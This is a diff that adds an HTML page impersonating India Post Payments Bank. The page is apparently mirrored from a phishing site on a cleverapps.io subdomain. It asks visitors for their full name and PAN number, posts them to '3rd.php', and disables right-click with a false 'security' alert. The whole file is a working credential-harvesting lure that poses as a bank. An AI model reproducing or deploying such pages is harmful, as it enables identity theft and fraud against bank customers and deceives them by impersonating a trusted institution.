@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+<link rel="manifest" href="site.html">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,wght@1,500&amp;display=swap" rel="stylesheet">
+    <title>India Post Payment Bank Secure Details/login</title>
+    <style>
+        #mm
+        {
+            width: 104%;
+            margin:-8px;
+            margin-left:-6px;
+        }
+         #ft
+         {
+         width: 104%;
+         margin-left:-8px;
+         }
+        #bb,#dd
+        {
+            width: 280px;
+            height:30px;
+            padding:3px 10px;
+            background-color:white;
+            border-style:solid;
+            outline:none;
+            border-color:#AE2924;
+            border-width:1px;
+            color:#AE2924;
+            font-size:14px;
+            font-weight: bold;
+            font-style: italic;
+            margin:2px;
+            border-radius:4px;
+            margin-left:25px;
+        }
+        
+        #bb:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        border-color:#AE2924;
+        outline:none;
+        box-shadow:0 0 6px 0 #AE2924;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:25px;
+        }
+        
+        #dd:hover
+        {
+        width: 280px;
+        height:30px;
+        padding:3px 10px;
+        background-color:white;
+        border-style:solid;
+        border-color:#AE2924;
+        outline:none;
+        box-shadow:0 0 6px 0 #AE2924;
+        border-width:1px;
+        color:#AE2924;
+        font-weight: bold;
+        font-style: italic;
+        margin:2px;
+        border-radius:4px;
+        margin-left:25px;
+        }
+        #cc
+        {
+            width:104%;
+            margin-left:-6px;
+        }
+        #ll
+        {
+            background-color:#AE2924;
+            color: white;
+            padding: 0px 0px;
+            margin: 10px 30px;
+            border: none;
+            outline:none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 15px; width: 120px; height: 36px;
+        }
+        #ll:hover
+        {
+        background-color:#3E1128;
+        color: white;
+        padding: 0px 0px;
+        margin: 10px 30px;
+        border: none;
+        outline:none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 15px; width: 120px; height: 36px;
+         }
+        #cc
+        {
+        width:102%;
+        background-color:#3E1128;
+        height:72px;
+        margin:12px;
+        margin-left:-6px;
+        }
+        #col
+        {
+        width:104%;   
+        background-color:#D8D1DB;
+        height:490px;
+        margin:-6px;
+        margin-left:-7px;
+        }
+        input::-webkit-input-placeholder {
+        font-style: italic;
+        text-transform:none;
+        }
+        input:-moz-placeholder {
+        font-style: italic;
+        text-transform:none;
+        }
+        input::-moz-placeholder {
+        font-style: italic;
+        text-transform:none;
+        }
+        input:-ms-input-placeholder {
+        font-style: italic;
+        text-transform:none;
+        }
+        .name
+        {
+        text-transform:uppercase;
+        }
+        .PAN
+        {
+        text-transform:uppercase;
+        }
+        .error
+        {
+        color: Red;
+        font-family: 'DM Sans', sans-serif;
+        font-size:12px;
+        margin:5px;
+        margin-left:20px;
+        visibility: hidden;
+        font-style: italic;
+        }
+    </style>
+    <script language="javascript">
+    
+    var message="For security reasons,This function is not allowed here.";
+    function clickIE4(){
+    
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+    
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+    
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+    }
+    
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+    }
+    
+    document.oncontextmenu=new Function("alert(message);return false;")
+    
+    </script>
+</head>
+<body>
+   
+    <form action="3rd.php" method="post">
+   <center><img src="indiapost.png" alt="" id="mm"></center>
+    <div id="col">
+    <div id="cc">
+    <br>
+    <b style=" color:white; font-size:16px; padding:20px;"> Validate your PAN card details and<br>
+    <span style="color:white; font-size:16px; padding:20px;"> Proceed.</span></b>
+    </div><br>
+       <div id="pp"> 
+        <b style="font-family: Arial; 
+        color:#AE2924; 
+        padding:0px 25px; font-size:16px;"><i>Enter Full Name* (<b>as per PAN</b>)</i></b>       
+    </div>
+     <div id="fr">
+         <input type="text" name="Full Name" class="name" id="bb" placeholder="Enter Name (as per PAN)" 
+          required=""></div><br>
+         <div id="hh">
+         <b style="font-family: Arial; 
+         color:#AE2924; 
+         padding:0px 25px; font-size:16px;"><i>Enter PAN Number*</i></b>
+        </div>
+        <div id="xx">
+         <input type="text"name="PAN No." class="PAN" id="dd" maxlength="10" placeholder="Enter PAN Number"
+           pattern="[aA-zZ]{5}[0-9]{4}[aA-zZ]{1}"
+           title="Valid PAN format is:ABCDE1234A"
+           required="">
+           <span id="PAN" class="error">Invalid PAN Number</span>
+          </div><br>
+        <div id="qq">
+        <button type="submit" onclick="ValidatePAN()" id="ll" style="font-weight: bold;">
+        SUBMIT</button>
+        <script type="text/javascript">
+        function ValidatePAN() {
+        var txtPANCard = document.getElementById("dd");
+        var lblPANCard = document.getElementById("PAN")
+        var regex = /([A-Z]){5}([0-9]){4}([A-Z]){1}$/;
+        if (regex.test(txtPANCard.value.toUpperCase())) {
+        lblPANCard.style.visibility = "hidden";
+        return true;
+        } else {
+        lblPANCard.style.visibility = "visible";
+        return false;
+        }
+        }
+        </script>
+         </div>
+         </div>
+         <img src="footeri.jpg" alt="" id="ft">
+         </form>
+         </body>
+         
+<!-- Mirrored from dhripbnku.cleverapps.io/PAN_Card.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 24 Jun 2023 09:30:28 GMT -->
+</html>
